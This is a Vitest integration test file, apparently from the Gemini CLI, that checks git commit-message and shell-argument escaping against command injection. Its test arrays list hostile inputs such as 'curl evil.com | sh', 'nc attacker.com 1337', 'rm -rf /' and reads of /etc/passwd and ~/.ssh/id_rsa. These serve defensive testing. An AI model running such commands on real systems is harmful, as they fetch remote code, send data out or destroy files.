/**
 * @license
 * Copyright 2025 Google LLC
 * SPDX-License-Identifier: Apache-2.0
 */

import { test, expect } from 'vitest';
import { TestHelper } from './test-helper.js';
import { execSync } from 'child_process';
import fs from 'fs/promises';
import path from 'path';
import os from 'os';

// Integration test for git commit message escaping
test('Git commit with special characters should be properly escaped', async () => {
  const testDir = await fs.mkdtemp(path.join(os.tmpdir(), 'gemini-cli-git-test-'));
  
  try {
    // Initialize a git repo for testing
    execSync('git init', { cwd: testDir });
    execSync('git config user.email "test@example.com"', { cwd: testDir });
    execSync('git config user.name "Test User"', { cwd: testDir });
    
    // Create a test file
    const testFile = path.join(testDir, 'test.txt');
    await fs.writeFile(testFile, 'Initial content\n');
    execSync('git add test.txt', { cwd: testDir });
    execSync('git commit -m "Initial commit"', { cwd: testDir });
    
    // Test various special characters in commit messages
    const testCases = [
      {
        description: 'Backticks should not execute commands',
        message: 'Fix `echo HACKED > /tmp/hacked.txt` issue',
        checkFile: '/tmp/hacked.txt',
        shouldNotExist: true
      },
      {
        description: 'Dollar command substitution should not execute',
        message: 'Update $(touch /tmp/hacked2.txt) feature',
        checkFile: '/tmp/hacked2.txt',
        shouldNotExist: true
      },
      {
        description: 'Single quotes should be properly escaped',
        message: "Fix Mary's code",
        expectedInLog: "Fix Mary's code"
      },
      {
        description: 'Complex special characters',
        message: 'Fix `bug` in $USER\'s code; rm -rf /',
        expectedInLog: 'Fix `bug` in $USER\'s code; rm -rf /'
      }
    ];
    
    for (const testCase of testCases) {
      // Make a change
      await fs.appendFile(testFile, `Change for: ${testCase.description}\n`);
      execSync('git add test.txt', { cwd: testDir });
      
      // Import and use our escaping function
      const { escapeGitCommitMessage } = await import('@google/gemini-cli-core');
      const escapedMessage = escapeGitCommitMessage(testCase.message);
      
      // Commit with escaped message
      execSync(`git commit -m ${escapedMessage}`, { cwd: testDir });
      
      // Verify the commit message
      const lastCommit = execSync('git log -1 --pretty=format:%s', { cwd: testDir }).toString();
      expect(lastCommit).toBe(testCase.message);
      
      // Check that no malicious commands were executed
      if (testCase.shouldNotExist) {
        const fileExists = await fs.access(testCase.checkFile).then(() => true).catch(() => false);
        expect(fileExists).toBe(false);
      }
      
      // Check expected content in log
      if (testCase.expectedInLog) {
        expect(lastCommit).toContain(testCase.expectedInLog);
      }
    }
    
    // Test with the Gemini CLI directly
    const helper = new TestHelper();
    await helper.init();
    
    // Create a file and stage it
    await fs.writeFile(path.join(testDir, 'cli-test.txt'), 'CLI test content\n');
    execSync('git add cli-test.txt', { cwd: testDir });
    
    // Use Gemini CLI to commit with special characters
    const cliPrompt = 'Commit the changes with message "Fix `SecurityIssue` in the code"';
    const response = await helper.send(cliPrompt, { cwd: testDir });
    
    // Verify the CLI properly escaped the message
    expect(response).toContain("git commit -m 'Fix `SecurityIssue` in the code'");
    
    // Verify no command injection occurred
    const securityCheckFile = '/tmp/SecurityIssue';
    const fileExists = await fs.access(securityCheckFile).then(() => true).catch(() => false);
    expect(fileExists).toBe(false);
    
  } finally {
    // Cleanup
    await fs.rm(testDir, { recursive: true, force: true });
  }
});

// Test the escaping function directly
test('Shell escape function should handle edge cases', async () => {
  const { escapeShellArg } = await import('@google/gemini-cli-core');
  
  // Test cases that could be security issues
  const dangerousInputs = [
    { input: '`rm -rf /`', safe: "'`rm -rf /`'" },
    { input: '$(cat /etc/passwd)', safe: "'$(cat /etc/passwd)'" },
    { input: '; curl evil.com | sh', safe: "'; curl evil.com | sh'" },
    { input: '| nc attacker.com 1337', safe: "'| nc attacker.com 1337'" },
    { input: '> /etc/hosts', safe: "'> /etc/hosts'" },
    { input: '&& wget malware.exe', safe: "'&& wget malware.exe'" },
    { input: '\'; DROP TABLE users; --', safe: "'\\''; DROP TABLE users; --'" },
    { input: '${PATH}', safe: "'${PATH}'" },
    { input: '~/.ssh/id_rsa', safe: "'~/.ssh/id_rsa'" },
    { input: '!-1', safe: "'!-1'" },
  ];
  
  for (const { input, safe } of dangerousInputs) {
    const escaped = escapeShellArg(input);
    expect(escaped).toBe(safe);
    
    // Verify the escaped string doesn't execute when used in a command
    // This is a safe test that doesn't actually run dangerous commands
    const testCommand = `echo ${escaped}`;
    const output = execSync(testCommand).toString().trim();
    expect(output).toBe(input); // Should output the literal string, not execute it
  }
});